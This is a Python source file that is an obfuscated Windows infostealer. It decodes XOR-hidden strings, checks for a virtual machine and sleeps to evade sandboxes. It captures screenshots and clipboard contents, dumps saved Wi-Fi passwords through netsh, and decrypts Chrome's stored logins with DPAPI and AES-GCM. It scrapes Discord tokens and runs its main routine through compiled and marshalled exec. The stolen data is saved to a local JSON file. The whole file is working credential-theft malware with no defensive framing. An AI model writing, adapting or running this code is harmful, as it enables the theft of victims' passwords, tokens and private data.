import base64, zlib, marshal, time, os, sys, random, ctypes, socket, subprocess, re, json, secrets
from pathlib import Path
from datetime import datetime

def _0x1(a):  # XOR decrypt
    k = "xAI_is_god_42069"
    return ''.join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(base64.b64decode(a).decode('latin1')))

def _0x2(t=1337):
    time.sleep((t + random.randint(100, 1000)) / 1000)

_0x2()

_e = {
    "app": _0x1("JgA1Aw0SJgMiKzI="),
    "chr": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWU="),
    "loc": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWVcVXNlciBEYXRhXFxMb2NhbCBTdGF0ZQ=="),
    "log": _0x1("JgA1Aw0SJgMiKzIuR29vZ2xlXFxDaHJvbWVcVXNlciBEYXRhXFxEZWZhdWx0XFxMb2dpbiBEYXRh"),
    "net": _0x1("BAYFBlQHDw=="),
    "wla": _0x1("BAYFBlQHDwMGBwYSJw=="),
    "pro": _0x1("Fg8KFAwZDA=="),
    "key": _0x1("DAgMAA0EVQ=="),
    "pow": _0x1("CQkFBAcFBg=="),
    "cli": _0x1("R0VULUNsaXBib2FyZA=="),
}

def _imp(m):
    return __import__(base64.b64decode(m).decode())

def _0x3(): 
    try: return _imp("d2luMzJjcnlwdA==")  # win32crypt
    except: return None

def _0x4(): 
    try: return _imp("AGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcy5jaXBoZXJzLmFlYWQ=").AESGCM
    except: return None

def _0x5(): 
    try: return _imp("AFBJTEw=").ImageGrab
    except: return None

def is_vm():
    _0x2(500)
    try:
        c = ctypes.windll.kernel32
        class M(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
        m = M(); m.dwLength = ctypes.sizeof(m)
        c.GlobalMemoryStatusEx(ctypes.byref(m))
        if m.ullTotalPhys // (1024*1024) < 3999: return True
    except: pass
    if os.cpu_count() < 4: return True
    return False

def _0x6():
    _0x2(200)
    try:
        g = _0x5().grab(all_screens=True)
        import io
        b = io.BytesIO()
        g.save(b, format="PNG")
        return base64.b64encode(b.getvalue()).decode()
    except: return ""

def _0x7():
    try:
        r = subprocess.run([_e["pow"], "-noprofile", "-Command", _e["cli"]], capture_output=True, text=True)
        return r.stdout.strip()
    except: return ""

def _0x8(): return socket.gethostname()

def _0x9():
    w = []
    try:
        o = subprocess.check_output([_e["net"], _e["wla"], "show", "profiles"], text=True, stderr=subprocess.DEVNULL)
        p = re.findall(r"All User Profile\s*:\s*(.+)", o)
        for n in p:
            n = n.strip()
            o2 = subprocess.check_output([_e["net"], _e["wla"], "show", "profile", n, _e["key"]], text=True, stderr=subprocess.DEVNULL)
            k = re.search(r"Key Content\s*:\s*(.+)", o2)
            if k: w.append({"ssid": n, "pass": k.group(1).strip()})
    except: pass
    return w

def _0x10():
    c = []
    if sys.platform != "win32": return c
    w = _0x3()
    if not w: return c
    a = os.getenv(_e["app"])
    if not a: return c
    ls = Path(a) / _e["chr"] / "User Data" / "Local State"
    ld = Path(a) / _e["chr"] / "User Data" / "Default" / "Login Data"
    if not ls.exists() or not ld.exists(): return c
    try:
        with open(ls, "r", encoding="utf-8") as f:
            s = json.load(f)
        ek = base64.b64decode(s["os_crypt"]["encrypted_key"])[5:]
        mk = w.CryptUnprotectData(ek, None, None, None, 0)[1]
        td = Path(os.getenv("TEMP")) / f"{secrets.token_hex(8)}.db"
        import shutil
        shutil.copy(ld, td)
        import sqlite3
        conn = sqlite3.connect(str(td))
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        aes = _0x4()
        for url, user, ep in cur.fetchall():
            if ep[:3] not in (b"v10", b"v11"): continue
            nonce, ct, tag = ep[3:15], ep[15:-16], ep[-16:]
            pt = aes(mk).decrypt(nonce, ct + tag, None)
            c.append({"url": url, "username": user, "password": pt.decode(errors="ignore")})
        conn.close()
        os.unlink(td)
    except: pass
    return c

def _0x11():
    t = set()
    paths = [
        Path(os.getenv("APPDATA")) / "discord" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA")) / "discordcanary" / "Local Storage" / "leveldb",
        Path(os.getenv("APPDATA")) / "discordptb" / "Local Storage" / "leveldb",
    ]
    pat = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}"
    for p in paths:
        if not p.exists(): continue
        for f in list(p.glob("*.ldb")) + list(p.glob("*.log")):
            try:
                with open(f, "r", errors="ignore") as fh:
                    for m in re.finditer(pat, fh.read()):
                        t.add(m.group())
            except: pass
    return list(t)

# === FULLY FIXED OBFUSCATED PAYLOAD ===
real_code = '''
import time as t, json
from datetime import datetime

def run():
    if is_vm():
        t.sleep(1800)
    data = {
        "info": {
            "hostname": _0x8(),
            "screenshot": _0x6(),
            "clipboard": _0x7(),
            "wifi": _0x9(),
            "timestamp": datetime.utcnow().isoformat()
        },
        "creds": {
            "browser_passwords": _0x10(),
            "discord_tokens": _0x11()
        }
    }
    with open("d.json", "w") as f:
        json.dump(data, f, indent=2)
    while True:
        t.sleep(86400)

run()
'''

code_obj = compile(real_code, '<obfuscated>', 'exec')
marshaled = marshal.dumps(code_obj)
compressed = zlib.compress(marshaled)
exec(marshal.loads(zlib.decompress(compressed)), globals())
